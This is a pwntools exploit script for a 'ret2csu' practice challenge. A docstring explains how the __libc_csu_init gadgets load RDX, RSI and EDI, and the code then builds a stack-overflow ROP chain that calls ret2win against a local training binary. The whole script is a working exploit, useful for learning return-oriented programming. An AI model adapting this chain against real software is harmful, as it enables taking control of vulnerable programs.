from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

bin = b"./ret2csu"
p = process(bin)
gdb.attach(p, api=True)
e = ELF(bin)
rop = ROP(e)

"""
Dumping `__libc_csu_init`, we find the two gadgets:

  400680:       4c 89 fa                mov    rdx,r15                         | Start of gadget 2
  400683:       4c 89 f6                mov    rsi,r14                         |
  400686:       44 89 ef                mov    edi,r13d                        |
  400689:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]           |
  40068d:       48 83 c3 01             add    rbx,0x1                         |
  400691:       48 39 dd                cmp    rbp,rbx                         |
  400694:       75 ea                   jne    400680 <__libc_csu_init+0x40>   |
  400696:       48 83 c4 08             add    rsp,0x8                         |
  40069a:       5b                      pop    rbx                             | Start of gadget 1
  40069b:       5d                      pop    rbp                             |
  40069c:       41 5c                   pop    r12                             |
  40069e:       41 5d                   pop    r13                             |
  4006a0:       41 5e                   pop    r14                             |
  4006a2:       41 5f                   pop    r15                             |
  4006a4:       c3                      ret                                    |

Use these to setup RDI, RSI and RDX as required for a later call to `ret2win`.

High-level plan:

    1. Call gadget 1
    2. Call gadget 2 (which falls through to gadget 1 again...)
    3. EDI, RSI and RDX should now be set; EDI isn't enough for `ret2win` (we need RDI to be arg1)
    4. Call `pop rdi; ret` to "reset" RDI so it's the correct arg1 value for `ret2win`
    5. Call `ret2win`!

Note that we have to account for side effects any fall-through operations might
cause so that the registers are correct when we finally call `ret2win`...

---

Gadget 1:

  pop rbx
  pop rbp
  pop r12
  pop r13
  pop r14
  pop r15
  ret

Setup:

1. Set RBX to `0x0` so `call QWORD PTR [r12+rbx*8]` becomes `call [r12]`.

2. Set RBP to `0x1` so that later when gadget 2 runs, `cmp rbp, rbx` sets ZF=1, 
   and `jne 400...` doesn't branch.

3. Set R12 to a _pointer_ to `_init` (a benign call); the `DT_INIT` value in the
   `.dynamic` table, i.e. a pointer to the `_init` function. The `_init`
   function basically does nothing and so we can be sure it won't corrupt the 
   EDI, RSI and RDX register values we've set for later when `ret2win` is called.

4. Set R13 - R15 values as `ret2win` expects. The value in R13d will make it
   into EDI, R14 into RSI, and R15 into RDX. As mentioned, EDI alone isn't 
   enough for `ret2win`... (see below).

Gadget 2:

  mov rdx, r15          ; RDX correct!
  mov rsi, r14          ; RSI correct!
  mov edi, r13d         ; Only low 32 bits of R13 end up in EDI...
  call [r12 + rbx*8]    ; With RBX=0, calls the function pointer at [R12] (`_init`)
  add rbx, 1            ; RBX = 1
  cmp rbp, rbx          ; With RBP=1, sets ZF=1
  jne 0x400680          ; Not taken (ZF=1)
  add rsp, 0x8          ; Consumes one dummy qword from the stack...

After gadget 2 runs, we fall-through to gadget 1 again... so, we have to make
sure the stack provides:

    - 1 dummy qword (to account for `add rsp, 0x8`)
    - 6 dummy qwords for the `pop` operations for RBX, RBP, R12 - R15

The next QWORD on the stack is a `pop rdi; ret` gadget to set RDI correctly for 
arg1.

Finally we have the `ret2win` address.
"""

# Gadgets...
#
# 0x00000000004006a3: pop rdi; ret
# --------------
# `__libc_csu_init` gadgets found with `rp++`.
#   `csu_gadget_1`:
#    - 0x40069a: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#   `csu_gadget_2`:
#    - 0x400680: mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12+rbx*8+0]
#
pop_rdi_ret = 0x4006A3
csu_gadget_1 = 0x40069A
csu_gadget_2 = 0x400680

# Args for `ret2win`
arg1 = 0xDEADBEEFDEADBEEF
arg2 = 0xCAFEBABECAFEBABE
arg3 = 0xD00DF00DD00DF00D

ret2win_addr = e.plt["ret2win"]
info(f"ret2win addr {hex(ret2win_addr)}")

ret_addr = rop.find_gadget(["ret"]).address

# R12 must point to a function pointer slot.
# DT_INIT d_val in .dynamic - function pointer to `_init`
init_addr = 0x600E38


payload = b"A" * 40
# Gadget 1 - load controls and staged args
payload += p64(csu_gadget_1)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(init_addr)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
# Gadget 2 - move into RDX, RSI, EDI and `call [r12]`
payload += p64(csu_gadget_2)
# After gadget 2, execution falls through to:
#   `add rsp, 0x8`
#   `pop rbx; ...`
payload += p64(0)  # Junk for `add rsp, 0x8`
payload += p64(0)  # `pop rbx`
payload += p64(0)  # `pop rbp`
payload += p64(0)  # `pop r12`
payload += p64(0)  # `pop r13`
payload += p64(0)  # `pop r14`
payload += p64(0)  # `pop r15`
# Reload RDI with arg1 (EDI alone isn't enough!)
payload += p64(pop_rdi_ret)
payload += p64(arg1)
# Call `ret2win`!
payload += p64(ret2win_addr)

p.sendafter(b"> ", payload)
p.recvall()
